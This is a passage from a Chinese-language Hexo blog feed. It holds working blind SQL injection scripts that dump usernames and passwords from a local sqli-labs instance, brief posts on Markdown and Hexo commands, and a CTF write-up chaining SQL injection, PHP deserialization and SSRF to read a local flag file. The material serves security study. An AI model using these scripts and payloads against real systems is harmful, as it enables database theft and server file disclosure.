group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;table_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tables_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取表中字段</span><br><span class="line">def columns_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 30):</span><br><span class="line">        for i in &#39;abcdefghijklmnopqrstuvwxyz,&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;column_name:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">columns_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取username</span><br><span class="line">def username_value():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz,_-&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(username) from users),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;username_value:&#39;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username_value()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 获取password</span><br><span class="line">def password_value():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz,_-&#39;:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-8&#x2F;index.php?id&#x3D;1&#39; and substr((select group_concat(password) from users),%d,1)&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                j, i)</span><br><span class="line">            r &#x3D; requests.get(url + &#39;%23&#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                name &#x3D; name + i</span><br><span class="line"></span><br><span class="line">                print(name)</span><br><span class="line"></span><br><span class="line">                break</span><br><span class="line">    print(&#39;password_value:&#39;, name)</span><br><span class="line"></span><br><span class="line">password_value()</span><br></pre></td></tr></table></figure><h2 id="sqlserver数据库-3"><a href="#sqlserver数据库-3" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h2><h2 id="Oracle数据库-2"><a href="#Oracle数据库-2" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><hr><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul><li>对界面没有回显时可以尝试使用时间盲注，即如果语句正确就延迟，通过延迟的时间判断sql语句是否被执行了<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><blockquote><p>sleep()                          //延迟函数<br>if(condition,true,false)          //条件语句<br>ascii()                          //转换成ascii码<br>substring(“string”,strart,length)//mid()也一样，取出字符串里的第几位开始，长度多少的字符</p></blockquote></li></ul><h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><blockquote><p>?id=’ or if ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_name=database() limit 0,1)&gt;0,sleep(5),0) %23<br>//判断第一个表的第一个字符是否大于0，如果大于0则sleep，不大于0则不会sleep,同样要使用python脚本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 获取数据库名长度</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1, 10):</span><br><span class="line">        url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-9&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(length(database())&gt;%s,sleep(5),0)&#39;&#39;&#39; % i</span><br><span class="line">        # print(url+payload+&#39;%23&#39;)</span><br><span class="line">        time1 &#x3D; datetime.datetime.now()</span><br><span class="line">        r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">        time2 &#x3D; datetime.datetime.now()</span><br><span class="line">        sec &#x3D; (time2 - time1).seconds</span><br><span class="line">        if sec &gt;&#x3D; 5:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(i)</span><br><span class="line">            break</span><br><span class="line">    print(&#39;database_len:&#39;, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_len()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;77&#x2F;sqllab&#x2F;Less-9&#x2F;index.php&#39;&#39;&#39;</span><br><span class="line">            payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(substr(database(),%d,1)&#x3D;&#39;%s&#39;,sleep(5),1)&#39;&#39;&#39; % (</span><br><span class="line">                j, i)</span><br><span class="line">            # print(url+payload+&#39;%23&#39;)</span><br><span class="line">            time1 &#x3D; datetime.datetime.now()</span><br><span class="line">            r &#x3D; requests.get(url + payload + &#39;%23&#39;)</span><br><span class="line">            time2 &#x3D; datetime.datetime.now()</span><br><span class="line">            sec &#x3D; (time2 - time1).seconds</span><br><span class="line">            if sec &gt;&#x3D; 5:</span><br><span class="line">                name +&#x3D; i</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure><hr><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><ul><li>在SQL中，分号（;）是用来表示一条sql语句的结束。我们可以尝试使用分号闭合前面的sql语句，再构造另一条sql语句<blockquote><p>show databases<br>show tables<br>show columns from ‘’</p></blockquote></li></ul><hr><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</li><li>使用地方：修改账户密码、发布留言、发布内容的部分等需要与数据库交互的</li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="web" scheme="http://fybc.xyz/categories/web/"/>
    
    
    <category term="sql" scheme="http://fybc.xyz/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://fybc.xyz/posts/23825/"/>
    <id>http://fybc.xyz/posts/23825/</id>
    <published>2020-06-03T15:17:52.000Z</published>
    <updated>2021-01-25T12:49:59.403Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="maekdown的简单介绍"><a href="#maekdown的简单介绍" class="headerlink" title="maekdown的简单介绍"></a>maekdown的简单介绍</h1><ul><li>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</li><li>简单的来说，就是使用markdown编写的会帮我们转换html语句，文件的后缀名是.md，这也是我们编写blog最常用到的语言</li></ul><hr><h1 id="markdown文件的常用编写的语法"><a href="#markdown文件的常用编写的语法" class="headerlink" title="markdown文件的常用编写的语法"></a>markdown文件的常用编写的语法</h1><h2 id="标题的写法"><a href="#标题的写法" class="headerlink" title="标题的写法"></a>标题的写法</h2><ul><li>标题使用#，一个#为一级标题，两个为二级标题，依此类推一共是有六级标题，对应h1-h6<br><img src="/img/md2.png" alt="1">  <img src="/img/md1.png" alt="2"></li><li>也可以写成#一级标题#，##二级标题##，###三级标题###，在#中间写<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2></li><li>无序列表可以用* ， + ， — 来创建</li><li>有序列表使用数字加点实现，比如1.2.但</li><li>需要注意的是有序列表的序号是根据第一行列表的数字顺序来的，比如1. 5. 6.结果会显示1. 2. 3.<br><img src="/img/md3.png" alt="3"><br>效果如下：</li><li>无序列表</li></ul><ul><li>无序列表</li></ul><ul><li>无序列表</li></ul><ol><li>有序列表</li><li>有序列表</li><li>有序列表</li></ol><h2 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a>区块引用</h2><blockquote><p>使用&gt;进行区块引用，我编写的这里就使用了它</p><blockquote><p> 还可以进行多层嵌套，使用&gt;&gt;</p><blockquote><ul><li>同样也可以搭配*使用，即&gt;&gt;&gt; * </li></ul></blockquote></blockquote></blockquote><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul><li>有两种方式，分别是行内式，参数式，两种的链接文字都在[]中</li></ul><ol><li>行内式是[链接的文字](链接的地址)，如我写一个<br><code>[百度](http://www.baidu.com)</code><br>效果如下，会出现我们在[]写的文字，点击之后就会超链接到百度，属性只能带title<br><a href="http://www.baidu.com" target="_blank" rel="noopener">百度</a></li><li>参数式是[链接的名称]: 链接的地址 “title”<br><code>[百度]: http://www.baidu.com &quot;名称&quot;</code></li></ol><p>使用[百度]，来调用超链接，效果如<a href="http://www.baidu.com" target="_blank" rel="noopener" title="名称">百度</a></p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><ul><li>图片与之前链接的用法相同，但是使用时需要加！，即![名称](/img/xx)，这样会直接调用路径里的图片</li></ul><h2 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h2><ul><li>单行时使用``包裹即可，即单个反引号，效果如下<br><code>这是被包裹的代码</code></li><li>多行注释使用``` ```包起来，效果如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">11111</span><br><span class="line">22222</span><br><span class="line">33333</span><br><span class="line">44444</span><br></pre></td></tr></table></figure></li></ul><h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><ul><li>使用一个*或者一个_包起来是倾斜,如<blockquote><p>*你好呀*<br>_你好呀_</p><blockquote><p><em>你好呀</em><br><em>你好呀</em></p></blockquote></blockquote></li><li>使用两个**或者两个__包起来是加粗，如<blockquote><p>**你好呀**<br>__你好呀__</p><blockquote><p><strong>你好呀</strong><br><strong>你好呀</strong></p></blockquote></blockquote></li></ul><h2 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h2><ul><li>使用斜杠,这个经常需要用到，将md中有意义的转义为普通的字符</li></ul><h2 id="斜线"><a href="#斜线" class="headerlink" title="斜线"></a>斜线</h2><ul><li>使用三个-即___添加一个斜线，主要是美观，效果如下</li></ul><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/liugang-vip/p/6337580.html" target="_blank" rel="noopener">https://www.cnblogs.com/liugang-vip/p/6337580.html</a><br><a href="https://baike.baidu.com/item/markdown/3245829?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/markdown/3245829?fr=aladdin</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="命令" scheme="http://fybc.xyz/categories/%E5%91%BD%E4%BB%A4/"/>
    
    
    <category term="语法" scheme="http://fybc.xyz/tags/%E8%AF%AD%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>hexo</title>
    <link href="http://fybc.xyz/posts/21358/"/>
    <id>http://fybc.xyz/posts/21358/</id>
    <published>2020-06-03T13:46:45.000Z</published>
    <updated>2020-06-04T15:22:34.721Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h1><hr><h2 id="hexo-server"><a href="#hexo-server" class="headerlink" title="hexo server"></a>hexo server</h2><p><code>hexo s</code><br>启动服务器。默认情况下，访问网址为： <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></p><blockquote><p>预览的同时可以修改文章内容或主题代码，保存后刷新页面即可；<br>对hexo的config.yml修改，需要重启服务器</p></blockquote><h2 id="hexo-deploy"><a href="#hexo-deploy" class="headerlink" title="hexo deploy"></a>hexo deploy</h2><p><code>hex deploy</code><br>自动生成网站静态文件，并部署到设定的仓库</p><blockquote><p>如果设置了github会上传到github上</p></blockquote><h2 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a>hexo clean</h2><p><code>hexo clean</code><br>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</p><blockquote><p>在网站出现异常的时候试试</p></blockquote><h2 id="hexo-new"><a href="#hexo-new" class="headerlink" title="hexo new"></a>hexo new</h2><p><code>hexo n 文章名称</code><br>在source/posts中新建一篇md文件</p><blockquote><p>新建文章可以直接在post中删除，再使用hexo g重新生成静态<br>hexo new page x 是在source中生成目录<br>文章的标题是可以再md中修改的，所以可以写的简单点</p></blockquote><h2 id="hexo-generate"><a href="#hexo-generate" class="headerlink" title="hexo generate"></a>hexo generate</h2><p><code>hexo g</code><br>生成网站静态文件到默认设置的 public 文件夹。</p><blockquote><p>会重新生成public，之前我之前把照片放到public的img目录就中招了，图片全没了<br>建议在部署网站前使用</p></blockquote><h2 id="hexo-version"><a href="#hexo-version" class="headerlink" title="hexo version"></a>hexo version</h2><p><code>hexo version</code></p><h2 id="常用组合"><a href="#常用组合" class="headerlink" title="常用组合"></a>常用组合</h2><p><code>hexo clean &amp;&amp; hexo s</code><br><code>hexo clean &amp;&amp; hexo d</code></p><blockquote><p>可以设置快捷<br>当然我觉得都差不多</p></blockquote><hr><h1 id="文章的属性"><a href="#文章的属性" class="headerlink" title="文章的属性"></a>文章的属性</h1><ul><li>title        标题            文章的文件名</li><li>date            建立日期         文件建立日期</li><li>updata       更新日期      文件更新日期</li><li>comments     是否开启评论    true</li><li>tags           标签             </li><li>categgories  分类</li><li>permalink       url的名字</li><li>cover           封面设置</li><li>top_img        文章顶部图片</li></ul><hr><h1 id="我踩的一些坑"><a href="#我踩的一些坑" class="headerlink" title="我踩的一些坑"></a>我踩的一些坑</h1><ul><li>public文件是临时生成的，使用hexo clean就会清除掉，所以文件要放到source中</li><li>先使用hexo g生成public文件，再使用hexo d上传到github，才能在网上看到</li><li>编写md文件，与属性之间一定要有空格</li></ul><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://jerryc.me/posts/dc584b87/#Page-Front-matter" target="_blank" rel="noopener">https://jerryc.me/posts/dc584b87/#Page-Front-matter</a><br><a href="https://hexo.io/zh-cn/docs/front-matter" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/front-matter</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;js&#92;APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="命令" scheme="http://fybc.xyz/categories/%E5%91%BD%E4%BB%A4/"/>
    
    
    <category term="hexo" scheme="http://fybc.xyz/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>fakebook wp</title>
    <link href="http://fybc.xyz/posts/41754/"/>
    <id>http://fybc.xyz/posts/41754/</id>
    <published>2020-06-02T13:15:03.000Z</published>
    <updated>2021-01-25T12:05:59.986Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><h2 id="考点：sql注入，反序列化，ssrf漏洞利用"><a href="#考点：sql注入，反序列化，ssrf漏洞利用" class="headerlink" title="考点：sql注入，反序列化，ssrf漏洞利用"></a>考点：sql注入，反序列化，ssrf漏洞利用</h2><ul><li>在页面上注册之后，点进去，发现有一个?no=1,猜测是否存在一个注入点<br><img src="/img/fakebook1.png" alt="1"></li></ul><ul><li>在输入1=1和1=2后发现存在注入，且行数为4行，再继续union select是发现是被waf过滤了，使用/**/union/**/select来绕过<br><img src="/img/fakebook2.png" alt="2"><ul><li>在username中进行了回显，使用手工注入的方式获取表名和字段的内容<blockquote><p>payload为：union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#  //获取表名users<br>union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()#  //获取四个字段</p></blockquote></li></ul></li></ul><p><img src="/img/fakebook3.png" alt="3"></p><ul><li>查看data字段的一个内容<br><img src="/img/fakebook4.png" alt="4"></li><li>可以猜测，我们输入的信息被保存为序列化，读取的时候会从数据库中取出并反序列化，然后显示在blog界面</li><li>同时网站还暴露了后台目录的备份<br><img src="/img/fakebook5.png" alt="5"><br>下载打开后，对源码审计<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">                <span class="comment">/*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*/</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_setopt — 为给定的cURL会话句柄设置一个选项。</span></span><br><span class="line"><span class="comment">                说明：</span></span><br><span class="line"><span class="comment">                    bool curl_setopt ( resource $ch , int $option , mixed $value )</span></span><br><span class="line"><span class="comment">                参数:</span></span><br><span class="line"><span class="comment">                    ch：由 curl_init() 返回的 cURL 句柄。</span></span><br><span class="line"><span class="comment">                    option：需要设置的CURLOPT_XXX选项。</span></span><br><span class="line"><span class="comment">                    value：将设置在option选项上的值。</span></span><br><span class="line"><span class="comment">                    对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span></span><br><span class="line"><span class="comment">                        CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span></span><br><span class="line"><span class="comment">                    对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span></span><br><span class="line"><span class="comment">                        CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span></span><br><span class="line"><span class="comment">                         </span></span><br><span class="line"><span class="comment">                         </span></span><br><span class="line"><span class="comment">                        ###################</span></span><br><span class="line"><span class="comment">                        文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">                <span class="comment">/*curl_exec ：执行 cURL 会话*/</span></span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">         <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_getinfo — 获取一个cURL连接资源句柄的信息</span></span><br><span class="line"><span class="comment">                说明：</span></span><br><span class="line"><span class="comment">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span></span><br><span class="line"><span class="comment">                参数：</span></span><br><span class="line"><span class="comment">                      ch 由 curl_init() 返回的 cURL 句柄。</span></span><br><span class="line"><span class="comment">                      opt：这个参数可能是以下常量之一:</span></span><br><span class="line"><span class="comment">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);  <span class="comment">//这里是blog调用了get的函数，获取的blog连接，如果连接失败就404，否则读取文件信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码审计之后，发现这段代码主要是对获取到的blog进行操作的，使用了curl，function get($url)获取的blog连接，如果连接失败就404，否则读取文件信息</li></ul><blockquote><p>接下来就利用到了ssrf漏洞读取任意文件，data数据中存储了我们存储后的序列化的数据，那么也可以利用sql把我们编好的反序列化放入其中，然后进行执行，利用到curl的一个漏洞，直接执行了blog里的url，我们尝试把blog的url利用反序列化改成本地文件flag.php的一个目录然后读取。就完成了ssrf漏洞的利用</p></blockquote><ul><li>为了绕过正则，不从注册登录的地方下手，直接人为构造联合查询返回语句<blockquote><p>payload为：payload：/view.php?no=0/**/union/**/select 1,2,3,’O:8:”UserInfo”:3:<br>{s:4:”name”;s:1:”1”;s:3:”age”;i:1;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p></blockquote></li></ul><p>可以先自己构造出反序列化代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Userinfo&#123;</span><br><span class="line">public $name&#x3D;&#39;1&#39;;</span><br><span class="line">public $age&#x3D;&#39;1&#39;;</span><br><span class="line">public $blog&#x3D;&#39;file:&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$data&#x3D;new Userinfo();</span><br><span class="line">echo serialize($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>我们已经成功的把要读取的目标写到了blog中<br><img src="/img/fakebook6.png" alt="6"></li><li>需要注意的是要在页面的源代码中打开链接，得到flag<br><img src="/img/fakebook7.png" alt="7"></li></ul><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>1.做这道题的时候没想到用/**/来绕过对空格和union select，还是要多掌握一些sql注入绕过的方法。</li><li>2.除了使用union联合查询，也可以使用报错注入来得到数据，并且也可以用 ++union++select 进行绕过</li><li>3.代码审计curl是读取了blog的信息的，但是没有进行过滤，所以我们可以尝试ssrf</li><li>4.最后把序列化放到第四个位置是因为data数据在表中第四列，服务器是反序列化data传给前端的，所以我们在blog中能得到我们想要的数据</li></ul>]]></content>
    
    
      
      
